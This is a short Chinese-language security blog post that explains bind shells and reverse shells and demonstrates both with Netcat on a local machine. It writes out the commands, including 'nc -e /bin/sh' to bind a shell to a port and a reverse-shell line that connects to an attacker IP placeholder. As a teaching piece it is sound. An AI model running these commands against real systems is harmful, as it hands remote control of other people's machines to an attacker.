---
id: "06f2b810960ff302feca626e7ecb1870829c37e4"
title: "Bind Shell 與 Reverse Shell"
description: ""
date: 2021-01-10T21:00:59+08:00
draft: false
featureImage: "/images/hero-main.jpg"
images:
    - "/images/og_image.png"
categories:
    - 資訊安全
tags:
    - 攻擊手法
    - Netcat
    - 遠端執行指令攻擊
aliases:
    - /post/2021/bind_shell_and-reverse_shell_with_netcat/
---

Bind Shell 與 Reverse Shell 是兩種常見的遠端執行指令的技術，讓攻擊者可以向目標主機發送並執行指令，常與檔案上傳漏洞 (File Upload Vulnerabilities) 搭配使用。

這是我在研究檔案上傳漏洞時發現的一個有趣的攻擊手法，所以把它記錄下來，但也沒有太深入去專研，所以讀完本文不會讓你精通，只會讓你簡單了解並知道如何使用。

本文將使用 Netcat 來 Demo。

<!--more-->

## Bind Shell

Bind Shell 是在目標主機中，將 Shell (或其他執行的程式) 綁定在某一個 Port 上，執行由那個 Port 收到的指令，而攻擊者就可以建立連線後，利用對這個 Port 發送指令進而執行攻擊指令。

如果防火牆有擋 Port，就不能用這個方式，要改用 [Reverse Shell](#reverse-shell)。

{{<mermaid>}}

graph LR
    subgraph "Bind Shell"
    a[發送攻擊指令] --連線某個 TCP Port-->b
    subgraph 攻擊者
        a
    end
    subgraph 目標
        b[Shell]
    end
    end

{{</mermaid>}}

### Demo

使用 Netcat 示範，並使用本機兩個終端來分別模擬攻擊者與目標主機，而 Port 將使用 1234。

#### 執行步驟

1. 於目標上監聽 Port 1234，並使用 sh 去執行。
   
   ```bash
   nc -l -v -p 1234 -e /bin/sh
   ```
   
2. 攻擊者與 Port 1234 建立連線。
   
   ```bash
   nc <目標 IP> 1234
   ```

3. 下達攻擊指令 (為了模擬，使用 `pwd` 代替)

{{< img src="/images/2021/bind_shell_demo.png" caption="Bind Shell Demo (左為攻擊者 / 右為目標)" >}} 

可以看到圖中，攻擊者執行 `pwd` 拿到了目標主機的路徑，也就代表有成功執行遠端指令。

## Reverse Shell

Reverse Shell 剛好跟 Bind Shell 相反，是在攻擊者這邊監聽一個 Port，然後將目標主機與這個 Port 建立連線，再將收到的指令由 Shell (或其他執行的程式) 執行。

常用於因為防火牆規則無法與其他 Port 建立連線時，但可以對外連線時使用。

{{<mermaid>}}

graph RL
subgraph "Reverse Shell"
    b --連線某個 TCP Port-->a[發送攻擊指令]
subgraph 攻擊者
    a
end
subgraph 目標
    b[Shell]
end
end

{{</mermaid>}}

### Demo

使用 Netcat 示範，並使用本機兩個終端來分別模擬攻擊者與目標主機，而 Port 將使用 1234。

#### 執行步驟

1. 攻擊者監聽 Port 1234。
   
   ```bash
   nc -l -v -p 1234
   ```

2. 目標主機與攻擊者的 Port 1234 建立連線，並使用 sh 去執行。
   
   ```bash
   nc <攻擊者 IP> -e /bin/sh
   ```

3. 下達攻擊指令 (為了模擬，使用 `pwd` 代替)

{{< img src="/images/2021/reverse_shell_demo.png" caption="Reverse Shell Demo (左為攻擊者 / 右為目標)" >}}

可以看到圖中，攻擊者執行 `pwd` 拿到了目標主機的路徑，也就代表有成功執行遠端指令。

## 備註

雖然現在在 Linux 上直接安裝的 Netcat 不會帶有 `-e` 的參數，但還是有其他的替代方式可以使用，但本文 Demo 只為了簡單講解其運作方式，使用 `-e` 的方式執行。
